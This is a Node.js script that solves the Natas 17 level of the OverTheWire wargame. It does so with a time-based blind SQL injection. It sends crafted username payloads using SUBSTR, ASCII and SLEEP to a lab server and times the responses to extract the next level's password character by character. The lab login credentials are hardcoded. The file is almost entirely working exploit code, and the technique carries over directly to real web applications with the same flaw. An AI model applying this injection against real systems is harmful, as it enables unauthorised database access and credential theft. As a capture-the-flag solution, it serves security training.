// var async = require('async');
var queue = require('queue-async');
var request = require('request');

// var test = "This user exists";
var natas17 = 'http://natas17.natas.labs.overthewire.org/';
var natas17user = 'natas17';
var natas17pass = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw';
var password = '';

var alphaNumeric = range('a', 'z').concat(range('A', 'Z'), range('0', '9'));

function range(start,stop) {
  var result=[];
  for (var idx=start.charCodeAt(0),end=stop.charCodeAt(0); idx <=end; ++idx){
    result.push(String.fromCharCode(idx));
  }
  return result;
}

function callback(character, next, error, response, body) {
  if (error) {
    return next(error); 
  } else if (!error && response.statusCode === 200) {
    
    console.log(response.elapsedTime);

    var goodChar = (response.elapsedTime > 2000) ? character : undefined;

    if (goodChar) {
      password += goodChar;
      return next(null, goodChar);
    } else {
      return next();
    }
  }
}

function doRequest(pos, alphaChar, next) {
  var letter = alphaChar;
  var r = request.post(natas17, {
    time: true,
    timeout: 10000,
    auth: {
      'user': natas17user,
      'pass': natas17pass
    }
  }, callback.bind(this, letter, next));

// SELECT * from users where username="natas18" and if(substring(password,0,1) LIKE BINARY 'a', sleep(2), 1) #
// username=natas18%22%20AND%20ASCII(SUBSTR(password,"+str(start)+",1))=ASCII(%22"+str(char)+"%22)%20AND%20SLEEP(2)%20AND%20%22a%22=%22
  var form = r.form();
  form.append('debug', 'true');
  // form.append('username', 'natas18" AND IF(SUBSTRING(password, ' + pos + ', 1) LIKE BINARY' + letter + ',sleep(5),1) #');
  form.append('username', 'natas18" AND ASCII(SUBSTR(password,' + pos + ',1))=ASCII("'+letter+'") AND SLEEP(2) AND "a"="a')
}

var tasks = [];
for (var i=0, l=64; i<l; i+=1) {
  for (var j=0, alpha=alphaNumeric.length; j<alpha; j+=1) {
    tasks.push(doRequest.bind(null, i, alphaNumeric[j]));
  }
}

var q = queue(1);
tasks.forEach(function(t) { q.defer(t); });
q.awaitAll(function(error, results) {
  console.log(results);
  console.log(password);
});

